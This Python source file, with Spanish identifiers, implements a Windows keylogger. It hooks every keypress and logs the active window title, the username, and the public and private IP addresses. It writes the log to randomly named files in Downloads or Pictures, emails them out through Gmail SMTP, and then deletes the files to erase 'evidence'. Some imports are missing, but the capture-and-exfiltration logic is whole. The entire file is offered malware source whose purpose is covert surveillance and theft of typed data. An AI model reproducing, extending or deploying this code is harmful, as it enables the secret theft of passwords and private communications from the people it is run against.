import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config


fecha = time.ctime(time.time())
usuario = os.path.expanduser('~').split('\\')[2]
IPPublica = requests.get('https://api.ipify.org/').text
IPPrivada = socket.gethostbyname(socket.gethostname())

msj = f'[COMIENZO DE REGISTROS]\n  *~ Fecha/Hora: {fecha}\n  *~ Usuario-Perfil: {usuario}\n  *~ IP-Publica: {IPPublica}\n  *~ IP-Privada: {IPPrivada}\n\n'
informacion_loggeada = []
informacion_loggeada.append(msj)

app_vieja = ''
borrar_archivo = []


def tecla_presionada(tecla):
	global app_vieja

	app_nueva = win32gui.GetWindowText(win32gui.GetForegroundWindow())

	if app_nueva == 'Cortana':
		app_nueva = 'Menu de Inicio de Windows'
	else:
		pass
	
	
	if app_nueva != app_vieja and app_nueva != '':
		informacion_loggeada.append(f'[{fecha}] ~ {app_nueva}\n')
		app_vieja = app_nueva
	else:
		pass


	sustitucion = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[RETROCESO]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[FLECHA IZQUIERDA]', 'Key.right', '[FLECHA DERECHA]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[TECLA DE WINDOWS]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

	tecla = str(tecla).strip('\'')
	if tecla in sustitucion:
		informacion_loggeada.append(sustitucion[sustitucion.index(tecla)+1])
	else:
		informacion_loggeada.append(tecla)


def escribir_archivo(cuenta):
	dir_uno = os.path.expanduser('~') + '/Downloads/'
	dir_dos = os.path.expanduser('~') + '/Pictures/'
	
	dir_lista = [dir_uno,dir_dos]

	path_archivo = random.choice(dir_lista)
	nombre_archivo = str(cuenta) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
	archivo = path_archivo + nombre_archivo
	borrar_archivo.append(archivo)


	with open(archivo,'w') as fp:
		fp.write(''.join(informacion_loggeada))

	print('Archivo escrito correctamente')


def enviar_registros():
	cuenta = 0

	correo_fuente = config.correo_fuente
	correo_fuente_pass = config.correo_fuente_pass

	# = Para debuggear, cambiar si se va a usar
	correo_destino = correo_fuente

	MINUTOS = 10
	SEGUNDOS = 60
	
	# Usar time.sleep(MINUTOS*SEGUNDOS) para enviar el archivo cada MINUTOS minutos
	# 30 para debuggear
	time.sleep(30) 
	while True:
		if len(informacion_loggeada) > 1:
			try:
				escribir_archivo(cuenta)

				asunto = f'[{usuario}] ~ {cuenta}'

				msj = MIMEMultipart()
				msj['From'] = correo_fuente
				msj['To'] = correo_destino
				msj['Subject'] = asunto
				cuerpo = 'prueba'
				msj.attach(MIMEText(cuerpo,'plain'))

				adjunto = open(borrar_archivo[0],'rb')

				nombre_archivo_borrar = borrar_archivo[0].split('/')[2]

				parte = MIMEBase('application','octect-stream')
				parte.set_payload(adjunto.read())
				encoders.encode_base64(parte)
				parte.add_header('content-disposition','attachment;filename='+str(nombre_archivo_borrar))
				msj.attach(parte)

				text = msj.as_string()

				s = smtplib.SMTP('smtp.gmail.com',587)
				s.ehlo()
				s.starttls()
				s.ehlo()
				s.login(correo_fuente,correo_fuente_pass)
				s.sendmail(correo_fuente,correo_destino,text)
				print('Mail enviado')
				adjunto.close()
				s.close()

				os.remove(borrar_archivo[0])
				del informacion_loggeada[1:]
				del borrar_archivo[0:]
				print('Evidencia borrada')


				cuenta += 1

			except Exception as e:
				print('[!] enviar_registros // Error.. ~ %s' % e)
				pass




if __name__=='__main__':
	T1 = threading.Thread(target=enviar_registros)
	T1.start()

	with Listener(on_press=tecla_presionada) as listener:
		listener.join()
